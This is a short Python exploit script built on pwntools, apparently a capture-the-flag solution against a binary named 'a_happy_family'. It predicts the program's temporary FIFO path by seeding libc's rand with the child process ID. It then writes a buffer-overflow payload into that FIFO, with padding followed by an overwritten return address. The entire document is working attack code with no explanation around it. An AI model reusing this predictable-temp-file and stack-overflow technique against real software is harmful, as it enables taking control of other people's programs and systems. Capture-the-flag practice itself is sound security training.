#!/usr/bin/env python
from pwn import *
from ctypes import *
import subprocess
import os

def waiting(s):
    for _ in range(s):
        log.info('wait...')
        sleep(1)

C = CDLL('/lib/x86_64-linux-gnu/libc-2.23.so')

process = subprocess.Popen(['./a_happy_family'])
pid = process.pid
log.info('PID of parent subprocess: {}'.format(pid))
log.info('PID of  child subprocess: {}'.format(pid + 1)) 

CHARS = 62
randchars = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
fifpath = b'/tmp/fam-'

C.srand(pid + 1)
for _ in range(9, 20):
    fifpath += randchars[C.rand() % CHARS]

fifpath = fifpath.decode()
log.info('fifpath: {}'.format(fifpath))

waiting(5)
fifo = open(fifpath, 'w+')
payload = b'a' * 0x31 + b'b' * 4 + b'\x46\x88\x04\x08'
print >> fifo, payload
fifo.close()
os.remove(fifpath)

waiting(5)
